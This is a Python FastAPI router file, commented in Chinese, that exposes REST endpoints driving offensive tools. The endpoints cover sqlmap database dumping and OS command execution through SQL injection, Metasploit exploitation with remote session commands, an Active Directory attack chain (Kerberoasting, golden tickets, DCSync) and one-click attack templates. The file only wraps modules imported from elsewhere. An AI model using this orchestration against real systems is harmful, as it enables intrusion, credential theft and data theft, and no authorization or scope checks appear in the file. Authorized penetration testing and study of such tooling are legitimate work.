#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
实战能力API路由 - 提供sqlmap/Metasploit/AD攻击链/Web利用/一键模板的REST API

功能：
    - SQL注入扫描和利用（sqlmap集成）
    - Metasploit漏洞利用
    - AD域攻击链执行
    - Web深度漏洞扫描
    - 一键攻击模板执行
    - 工作流管理
"""

import os
import sys
import json
import time
from typing import Dict, List, Optional, Any
from fastapi import APIRouter, HTTPException, Query, Body
from pydantic import BaseModel, Field
from loguru import logger

# 导入实战模块
try:
    from combat.sqlmap.integrator import SQLMapIntegrator, quick_scan, quick_dump
    from combat.metasploit.enhanced import MetasploitEnhanced, quick_msf_scan
    from combat.ad_attack.chain_executor import ADAttackChain, quick_ad_attack
    from combat.web_exploit.scanner import WebExploitScanner, quick_web_scan
    from combat.workflow.attack_templates import AttackTemplateEngine, quick_execute_template
    COMBAT_AVAILABLE = True
except ImportError as e:
    logger.warning(f"实战模块导入失败: {e}")
    COMBAT_AVAILABLE = False

router = APIRouter(prefix='/api/v1/combat', tags=['实战能力'])


# ============================================
# 请求模型
# ============================================

class SQLScanRequest(BaseModel):
    """SQL注入扫描请求"""
    url: str = Field(..., description="目标URL")
    parameters: Optional[str] = Field(None, description="测试参数")
    level: int = Field(3, ge=1, le=5, description="测试级别")
    risk: int = Field(2, ge=1, le=3, description="风险级别")
    cookies: Optional[str] = Field(None, description="Cookie")
    timeout: int = Field(300, description="超时时间(秒)")


class SQLDumpRequest(BaseModel):
    """SQL Dump请求"""
    url: str = Field(..., description="目标URL")
    database: Optional[str] = Field(None, description="数据库名")
    tables: Optional[List[str]] = Field(None, description="表名列表")
    level: int = Field(3, ge=1, le=5)
    risk: int = Field(2, ge=1, le=3)
    timeout: int = Field(600, description="超时时间(秒)")


class MSFExploitRequest(BaseModel):
    """Metasploit漏洞利用请求"""
    module: str = Field(..., description="漏洞利用模块名")
    options: Dict[str, str] = Field(..., description="模块选项")
    payload: Optional[str] = Field(None, description="Payload名称")
    payload_options: Optional[Dict[str, str]] = Field(None, description="Payload选项")
    wait_for_session: bool = Field(True, description="是否等待会话")
    timeout: int = Field(60, description="超时时间(秒)")


class MSFQuickRequest(BaseModel):
    """Metasploit快速利用请求"""
    target: str = Field(..., description="目标IP")
    module: Optional[str] = Field(None, description="漏洞利用模块（默认自动选择）")
    port: int = Field(445, description="目标端口")
    payload_lhost: Optional[str] = Field(None, description="Payload监听地址")
    payload_lport: int = Field(4444, description="Payload监听端口")


class ADAttackRequest(BaseModel):
    """AD攻击链请求"""
    dc_ip: str = Field(..., description="域控IP")
    domain: str = Field(..., description="域名")
    username: Optional[str] = Field(None, description="用户名")
    password: Optional[str] = Field(None, description="密码")
    nt_hash: Optional[str] = Field(None, description="NT哈希")
    stages: Optional[List[str]] = Field(None, description="要执行的阶段")


class WebScanRequest(BaseModel):
    """Web漏洞扫描请求"""
    url: str = Field(..., description="目标URL")
    scan_types: Optional[List[str]] = Field(None, description="扫描类型")
    cookies: Optional[Dict[str, str]] = Field(None, description="Cookie")
    timeout: int = Field(10, description="请求超时")


class TemplateExecuteRequest(BaseModel):
    """模板执行请求"""
    template_id: str = Field(..., description="模板ID")
    target: Optional[str] = Field(None, description="目标")
    variables: Optional[Dict[str, Any]] = Field(None, description="变量覆盖")
    dry_run: bool = Field(False, description="试运行模式")


# ============================================
# SQL注入API
# ============================================

@router.post("/sql/scan", summary="SQL注入扫描")
async def sql_scan(request: SQLScanRequest):
    """扫描URL的SQL注入漏洞"""
    if not COMBAT_AVAILABLE:
        raise HTTPException(status_code=503, detail="实战模块不可用")

    try:
        integrator = SQLMapIntegrator()
        result = integrator.scan_url(
            url=request.url,
            parameters=request.parameters,
            level=request.level,
            risk=request.risk,
            cookies=request.cookies,
            timeout=request.timeout,
        )
        return {"success": True, "data": result.to_dict()}
    except Exception as e:
        logger.error(f"SQL扫描失败: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/sql/dump", summary="SQL数据库Dump")
async def sql_dump(request: SQLDumpRequest):
    """Dump数据库数据"""
    if not COMBAT_AVAILABLE:
        raise HTTPException(status_code=503, detail="实战模块不可用")

    try:
        integrator = SQLMapIntegrator()
        result = integrator.dump_database(
            url=request.url,
            database=request.database,
            tables=request.tables,
            level=request.level,
            risk=request.risk,
            timeout=request.timeout,
        )
        return {"success": True, "data": result.to_dict()}
    except Exception as e:
        logger.error(f"SQL Dump失败: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/sql/os-command", summary="SQL注入执行系统命令")
async def sql_os_command(
    url: str = Body(..., description="目标URL"),
    command: str = Body(..., description="要执行的命令"),
    level: int = Body(3),
    risk: int = Body(3),
):
    """通过SQL注入执行操作系统命令"""
    if not COMBAT_AVAILABLE:
        raise HTTPException(status_code=503, detail="实战模块不可用")

    try:
        integrator = SQLMapIntegrator()
        result = integrator.execute_os_command(url, command, level=level, risk=risk)
        return {"success": True, "data": result.to_dict()}
    except Exception as e:
        logger.error(f"SQL命令执行失败: {e}")
        raise HTTPException(status_code=500, detail=str(e))


# ============================================
# Metasploit API
# ============================================

@router.post("/msf/exploit", summary="Metasploit漏洞利用")
async def msf_exploit(request: MSFExploitRequest):
    """执行Metasploit漏洞利用"""
    if not COMBAT_AVAILABLE:
        raise HTTPException(status_code=503, detail="实战模块不可用")

    try:
        msf = MetasploitEnhanced()
        if not msf.connect():
            raise HTTPException(status_code=503, detail="无法连接到Metasploit RPC服务器")

        result = msf.execute_exploit(
            module_name=request.module,
            options=request.options,
            payload=request.payload,
            payload_options=request.payload_options,
            wait_for_session=request.wait_for_session,
            timeout=request.timeout,
        )
        msf.disconnect()
        return {"success": True, "data": result.to_dict()}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Metasploit利用失败: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/msf/quick", summary="Metasploit快速利用")
async def msf_quick(request: MSFQuickRequest):
    """快速漏洞利用（自动选择模块）"""
    if not COMBAT_AVAILABLE:
        raise HTTPException(status_code=503, detail="实战模块不可用")

    try:
        msf = MetasploitEnhanced()
        if not msf.connect():
            raise HTTPException(status_code=503, detail="无法连接到Metasploit RPC服务器")

        result = msf.quick_exploit(
            target=request.target,
            module_name=request.module,
            port=request.port,
            payload_lhost=request.payload_lhost,
            payload_lport=request.payload_lport,
        )
        msf.disconnect()
        return {"success": True, "data": result.to_dict()}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Metasploit快速利用失败: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/msf/sessions", summary="获取Metasploit会话列表")
async def msf_sessions():
    """获取所有活跃会话"""
    if not COMBAT_AVAILABLE:
        raise HTTPException(status_code=503, detail="实战模块不可用")

    try:
        msf = MetasploitEnhanced()
        if not msf.connect():
            raise HTTPException(status_code=503, detail="无法连接到Metasploit RPC服务器")

        sessions = msf.get_sessions()
        msf.disconnect()
        return {"success": True, "data": [s.to_dict() for s in sessions]}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"获取会话失败: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/msf/session/{session_id}/execute", summary="在会话中执行命令")
async def msf_session_execute(
    session_id: int,
    command: str = Body(..., embed=True),
    session_type: str = Body("shell", embed=True),
):
    """在指定会话中执行命令"""
    if not COMBAT_AVAILABLE:
        raise HTTPException(status_code=503, detail="实战模块不可用")

    try:
        msf = MetasploitEnhanced()
        if not msf.connect():
            raise HTTPException(status_code=503, detail="无法连接到Metasploit RPC服务器")

        if session_type == "meterpreter":
            output = msf.meterpreter_execute(session_id, command)
        else:
            output = msf.session_execute(session_id, command)

        msf.disconnect()
        return {"success": True, "data": {"output": output}}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"会话命令执行失败: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/msf/search", summary="搜索Metasploit模块")
async def msf_search(
    keyword: str = Query(..., description="搜索关键词"),
    module_type: str = Query(None, description="模块类型过滤"),
):
    """搜索Metasploit模块"""
    if not COMBAT_AVAILABLE:
        raise HTTPException(status_code=503, detail="实战模块不可用")

    try:
        msf = MetasploitEnhanced()
        if not msf.connect():
            raise HTTPException(status_code=503, detail="无法连接到Metasploit RPC服务器")

        modules = msf.search_modules(keyword, module_type)
        msf.disconnect()
        return {"success": True, "data": [m.__dict__ for m in modules]}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"模块搜索失败: {e}")
        raise HTTPException(status_code=500, detail=str(e))


# ============================================
# AD攻击链API
# ============================================

@router.post("/ad/full-chain", summary="执行完整AD攻击链")
async def ad_full_chain(request: ADAttackRequest):
    """执行从信息收集到域控接管的完整AD攻击链"""
    if not COMBAT_AVAILABLE:
        raise HTTPException(status_code=503, detail="实战模块不可用")

    try:
        chain = ADAttackChain(
            dc_ip=request.dc_ip,
            domain=request.domain,
            username=request.username,
            password=request.password,
            nt_hash=request.nt_hash,
        )
        result = chain.execute_full_chain()
        return {"success": True, "data": result.to_dict()}
    except Exception as e:
        logger.error(f"AD攻击链执行失败: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/ad/kerberoast", summary="Kerberoasting攻击")
async def ad_kerberoast(request: ADAttackRequest):
    """执行Kerberoasting攻击"""
    if not COMBAT_AVAILABLE:
        raise HTTPException(status_code=503, detail="实战模块不可用")

    try:
        chain = ADAttackChain(
            dc_ip=request.dc_ip,
            domain=request.domain,
            username=request.username,
            password=request.password,
        )
        chain.collect_info()
        results = chain.kerberoast()
        return {"success": True, "data": [r.to_dict() for r in results]}
    except Exception as e:
        logger.error(f"Kerberoasting失败: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/ad/asrep-roast", summary="AS-REP Roasting攻击")
async def ad_asrep_roast(request: ADAttackRequest):
    """执行AS-REP Roasting攻击"""
    if not COMBAT_AVAILABLE:
        raise HTTPException(status_code=503, detail="实战模块不可用")

    try:
        chain = ADAttackChain(
            dc_ip=request.dc_ip,
            domain=request.domain,
            username=request.username,
            password=request.password,
        )
        chain.collect_info()
        results = chain.asrep_roast()
        return {"success": True, "data": [r.to_dict() for r in results]}
    except Exception as e:
        logger.error(f"AS-REP Roasting失败: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/ad/golden-ticket", summary="生成黄金票据")
async def ad_golden_ticket(
    dc_ip: str = Body(...),
    domain: str = Body(...),
    krbtgt_hash: str = Body(...),
    username: str = Body("Administrator"),
    domain_sid: str = Body(None),
):
    """生成黄金票据"""
    if not COMBAT_AVAILABLE:
        raise HTTPException(status_code=503, detail="实战模块不可用")

    try:
        chain = ADAttackChain(dc_ip=dc_ip, domain=domain)
        ticket = chain.golden_ticket(
            krbtgt_hash=krbtgt_hash,
            username=username,
            domain_sid=domain_sid,
        )
        return {"success": True, "data": ticket.to_dict()}
    except Exception as e:
        logger.error(f"黄金票据生成失败: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/ad/dcsync", summary="DCSync域控同步")
async def ad_dcsync(request: ADAttackRequest):
    """执行DCSync域控同步"""
    if not COMBAT_AVAILABLE:
        raise HTTPException(status_code=503, detail="实战模块不可用")

    try:
        chain = ADAttackChain(
            dc_ip=request.dc_ip,
            domain=request.domain,
            username=request.username,
            password=request.password,
        )
        result = chain.dcsync()
        return {"success": True, "data": result}
    except Exception as e:
        logger.error(f"DCSync失败: {e}")
        raise HTTPException(status_code=500, detail=str(e))


# ============================================
# Web漏洞扫描API
# ============================================

@router.post("/web/scan", summary="Web深度漏洞扫描")
async def web_scan(request: WebScanRequest):
    """执行全面的Web漏洞扫描"""
    if not COMBAT_AVAILABLE:
        raise HTTPException(status_code=503, detail="实战模块不可用")

    try:
        scanner = WebExploitScanner(
            target_url=request.url,
            cookies=request.cookies,
            timeout=request.timeout,
        )
        result = scanner.full_scan(scan_types=request.scan_types)
        return {"success": True, "data": result.to_dict()}
    except Exception as e:
        logger.error(f"Web扫描失败: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/web/scan/sql-injection", summary="SQL注入检测")
async def web_scan_sql_injection(
    url: str = Body(...),
    parameter: str = Body(...),
    method: str = Body("GET"),
):
    """检测SQL注入漏洞"""
    if not COMBAT_AVAILABLE:
        raise HTTPException(status_code=503, detail="实战模块不可用")

    try:
        scanner = WebExploitScanner(target_url=url)
        vuln = scanner.scan_sql_injection(url, parameter, method)
        return {"success": True, "data": vuln.to_dict() if vuln else None}
    except Exception as e:
        logger.error(f"SQL注入检测失败: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/web/scan/xss", summary="XSS检测")
async def web_scan_xss(
    url: str = Body(...),
    parameter: str = Body(...),
    method: str = Body("GET"),
):
    """检测XSS漏洞"""
    if not COMBAT_AVAILABLE:
        raise HTTPException(status_code=503, detail="实战模块不可用")

    try:
        scanner = WebExploitScanner(target_url=url)
        vuln = scanner.scan_xss(url, parameter, method)
        return {"success": True, "data": vuln.to_dict() if vuln else None}
    except Exception as e:
        logger.error(f"XSS检测失败: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/web/scan/ssrf", summary="SSRF检测")
async def web_scan_ssrf(
    url: str = Body(...),
    parameter: str = Body(...),
    method: str = Body("GET"),
):
    """检测SSRF漏洞"""
    if not COMBAT_AVAILABLE:
        raise HTTPException(status_code=503, detail="实战模块不可用")

    try:
        scanner = WebExploitScanner(target_url=url)
        vuln = scanner.scan_ssrf(url, parameter, method)
        return {"success": True, "data": vuln.to_dict() if vuln else None}
    except Exception as e:
        logger.error(f"SSRF检测失败: {e}")
        raise HTTPException(status_code=500, detail=str(e))


# ============================================
# 攻击模板API
# ============================================

@router.get("/templates", summary="列出所有攻击模板")
async def list_templates(category: str = Query(None, description="按类别过滤")):
    """列出所有可用的攻击模板"""
    if not COMBAT_AVAILABLE:
        raise HTTPException(status_code=503, detail="实战模块不可用")

    try:
        engine = AttackTemplateEngine()
        templates = engine.list_templates(category=category)
        return {"success": True, "data": templates}
    except Exception as e:
        logger.error(f"模板列表获取失败: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/templates/{template_id}", summary="获取模板详情")
async def get_template(template_id: str):
    """获取指定模板的详细信息"""
    if not COMBAT_AVAILABLE:
        raise HTTPException(status_code=503, detail="实战模块不可用")

    try:
        engine = AttackTemplateEngine()
        template = engine.get_template(template_id)
        if not template:
            raise HTTPException(status_code=404, detail="模板不存在")
        return {"success": True, "data": template.to_dict()}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"模板详情获取失败: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/templates/execute", summary="执行攻击模板")
async def execute_template(request: TemplateExecuteRequest):
    """执行指定的攻击模板"""
    if not COMBAT_AVAILABLE:
        raise HTTPException(status_code=503, detail="实战模块不可用")

    try:
        engine = AttackTemplateEngine()
        result = engine.execute_template(
            template_id=request.template_id,
            target=request.target,
            variables=request.variables,
            dry_run=request.dry_run,
        )
        return {"success": True, "data": result.to_dict()}
    except ValueError as e:
        raise HTTPException(status_code=404, detail=str(e))
    except Exception as e:
        logger.error(f"模板执行失败: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/executions", summary="列出执行记录")
async def list_executions():
    """列出所有模板执行记录"""
    if not COMBAT_AVAILABLE:
        raise HTTPException(status_code=503, detail="实战模块不可用")

    try:
        engine = AttackTemplateEngine()
        executions = engine.list_executions()
        return {"success": True, "data": executions}
    except Exception as e:
        logger.error(f"执行记录获取失败: {e}")
        raise HTTPException(status_code=500, detail=str(e))


# ============================================
# 状态API
# ============================================

@router.get("/status", summary="实战能力状态")
async def combat_status():
    """获取实战能力模块状态"""
    return {
        "success": True,
        "data": {
            "available": COMBAT_AVAILABLE,
            "modules": {
                "sqlmap": COMBAT_AVAILABLE,
                "metasploit": COMBAT_AVAILABLE,
                "ad_attack": COMBAT_AVAILABLE,
                "web_exploit": COMBAT_AVAILABLE,
                "workflow": COMBAT_AVAILABLE,
            },
            "endpoints_count": 25,
            "description": "实战能力模块：SQL注入/Metasploit/AD攻击链/Web利用/一键模板",
        }
    }


logger.info("实战能力API路由已加载")
